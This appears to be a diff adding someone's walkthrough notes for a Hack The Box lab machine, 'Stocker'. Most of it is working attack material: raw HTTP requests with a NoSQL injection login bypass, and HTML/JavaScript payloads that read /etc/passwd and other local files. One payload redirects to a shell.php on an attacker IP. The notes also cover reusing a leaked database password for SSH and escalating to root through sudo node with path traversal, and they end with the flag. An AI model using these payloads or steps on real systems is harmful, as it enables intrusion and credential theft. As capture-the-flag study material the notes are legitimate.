@@ -1,0 +1,113 @@
+Box is using nginx so if we gain a shell or something we can find other attached
+domains
+
+Head of IT - Angoose Garden
+
+dev.stocker.htb => login site
+dev.stocker.htb/stock/ => says we need to be authenticated to enter
+
+dev.stocker.htb uses nodeJS for a login [Express]
+
+Inside of the POST Req in burp we can change the POST to a JSON Style as so:
+
+======= Begin =======
+
+POST /login HTTP/1.1
+Host: dev.stocker.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json => normally is application/xxx-url-encoding or etc
+Content-Length: 48
+Origin: http://dev.stocker.htb
+Connection: close
+Referer: http://dev.stocker.htb/login
+Cookie: connect.sid=s%3AOfk0YgOfPI_Q3NOm73I_J8QRpxQO5J9t.xzjcLet0gIrWxRWUj7oNpEqxMo9IrMdG52ZGpTASShE
+Upgrade-Insecure-Requests: 1
+
+{
+"username":"admin",
+"password":"password"
+}
+
+====== End =======
+
+As a NoSQL attempt, we can change the JSON value of password to something like
+{"$ne":""} -> no equals has the value of blank [the json reads the inside of the curlys]
+
+
+======== What we did =========
+
+POST /login HTTP/1.1
+Host: dev.stocker.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 51
+Origin: http://dev.stocker.htb
+Connection: close
+Referer: http://dev.stocker.htb/login
+Cookie: connect.sid=s%3AOfk0YgOfPI_Q3NOm73I_J8QRpxQO5J9t.xzjcLet0gIrWxRWUj7oNpEqxMo9IrMdG52ZGpTASShE
+Upgrade-Insecure-Requests: 1
+
+{
+"username":{"$ne":""},
+"password":{"$ne":""}
+}
+
+We had to change both the username and password to gain access
+
+====== End ========
+
+File Reading
+{
+<iframe src='../../../../etc/passwd' title='some random title' width='800' height='800'></iframe> >==> <iframe src=file:///etc/passwd width=800px height=500px></iframe>
+
+<script> window.parent.location.href='http://10.10.14.56/shell.php' </script>
+
+<script> var fs = require('fs'); var files = fs.readdirSync('../../../../'); document.write(files); </script>
+
+<script> var fs = require('fs'); fs.writeFile('exploit.php',window.parent.location.href='http://10.10.14.56/shell.php', function (err) { if (err) { return console.error(err); } } </script>
+
+========== Best Route =========
+<iframe src=file:///etc/passwd width=800px height=500px></iframe>
+<script> document.write(window.location) </script> -> window.location outputs the current webpages directory
+
+brute force enum using said list: <iframe src=<dir> width=800px height=500px></iframe>
+
+dir[] = {
+/etc/nginx/sites-enabled/nginx.conf [nothing special]
+/etc/nginx/sites-enabled/default    [nothing special]
+/var/www/html/index.html            [nothing special]
+/var/www/html/dev/index.js          [nothing]
+/var/www/html/dev/login.html        [nothing]
+/var/www/html/dev/login.js          [nothing]
+/var/www/dev/index.js               [Something Interesting!]
+/var/www/dev/login.js
+}
+
+index.js shows in the code
+
+// TODO: Configure loading from dotenv for production
+const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
+
+We can attempt to use IHeardPassphrasesArePrettySecure as a SSH pass for
+Angoose
+
+========= SSH ===========
+
+angoose@10.10.11.196:IHeardPassphrasesArePrettySecure
+
+============================================================================
+
+Running sudo -l we can run a command as root, this execs a js file
+so we just need to make a js file that reads the root.txt file or even system command to chmod u+s /bin/bash
+
+The command also doesnt force a directory so we can edit the command with basic path traversal to exec the js file we made in our home dir!
+
+sudo /usr/bin/node /usr/local/scripts/../../../../../../home/angoose/flag.js
+
+root:5ca000054f2ff1a7a65e464d732e811a
